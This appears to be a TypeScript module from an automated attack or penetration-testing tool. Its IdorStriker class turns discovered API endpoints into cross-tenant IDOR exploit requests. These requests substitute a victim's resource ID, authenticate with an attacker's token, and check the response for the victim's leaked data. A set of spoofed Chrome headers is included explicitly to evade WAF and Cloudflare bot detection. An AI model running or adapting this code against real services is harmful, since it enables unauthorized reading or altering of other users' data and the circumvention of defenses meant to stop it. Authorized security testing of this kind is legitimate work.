import { DiscoveredEndpoint, DualSessionContext, ExploitCandidate } from '../types.js';

/**
 * Standard realistic browser headers to blend in with legitimate user traffic
 * and bypass basic signature-based WAF/Cloudflare bot hurdles.
 */
export const REALISTIC_BROWSER_HEADERS: Record<string, string> = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  'Accept': 'application/json, text/plain, */*',
  'Accept-Language': 'en-US,en;q=0.9',
  'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
  'Sec-Ch-Ua-Mobile': '?0',
  'Sec-Ch-Ua-Platform': '"Windows"',
  'Sec-Fetch-Dest': 'empty',
  'Sec-Fetch-Mode': 'cors',
  'Sec-Fetch-Site': 'same-origin',
};

/**
 * DUAL-TOKEN IDOR STRIKER (XBOW Core Engine)
 * Takes a victim's resource ID and constructs cross-tenant requests authenticated as the attacker.
 */
export class IdorStriker {
  /**
   * Generates cross-tenant exploit candidates for an endpoint.
   */
  public static generateCandidates(
    endpoint: DiscoveredEndpoint,
    baseUrl: string,
    context: DualSessionContext
  ): ExploitCandidate[] {
    const candidates: ExploitCandidate[] = [];

    // Replace parameter placeholder with victim's resource ID
    let resolvedPath = endpoint.path;
    const idPatterns = [
      /:[a-zA-Z0-9_]+/g,
      /\{[a-zA-Z0-9_]+\}/g,
      /\$[a-zA-Z0-9_]+/g,
    ];

    let replaced = false;
    for (const pattern of idPatterns) {
      if (pattern.test(resolvedPath)) {
        resolvedPath = resolvedPath.replace(pattern, context.victimResourceId);
        replaced = true;
      }
    }

    // If path didn't have a template placeholder, check if it ends with / or append query
    if (!replaced) {
      if (resolvedPath.endsWith('/')) {
        resolvedPath += context.victimResourceId;
      } else {
        const queryChar = resolvedPath.includes('?') ? '&' : '?';
        resolvedPath += `${queryChar}id=${encodeURIComponent(context.victimResourceId)}`;
      }
    }

    const fullUrl = `${baseUrl.replace(/\/$/, '')}/${resolvedPath.replace(/^\//, '')}`;

    // Read attack candidate with human-like browser headers and dual-token baseline
    candidates.push({
      vector: endpoint.isStateMutating ? 'IDOR_MUTATE_VIOLATION' : 'IDOR_READ_VIOLATION',
      targetUrl: fullUrl,
      method: endpoint.method,
      headers: {
        ...REALISTIC_BROWSER_HEADERS,
        'Authorization': `Bearer ${context.attackerToken}`,
        'Content-Type': 'application/json',
      },
      baselineHeaders: {
        ...REALISTIC_BROWSER_HEADERS,
        'Authorization': `Bearer ${context.victimToken}`,
        'Content-Type': 'application/json',
      },
      body: endpoint.isStateMutating ? JSON.stringify({ resourceId: context.victimResourceId }) : undefined,
      baselineBody: endpoint.isStateMutating ? JSON.stringify({ resourceId: context.victimResourceId }) : undefined,
      expectedLeakFragment: context.victimSecretIdentifier || context.victimResourceId,
    });

    return candidates;
  }
}
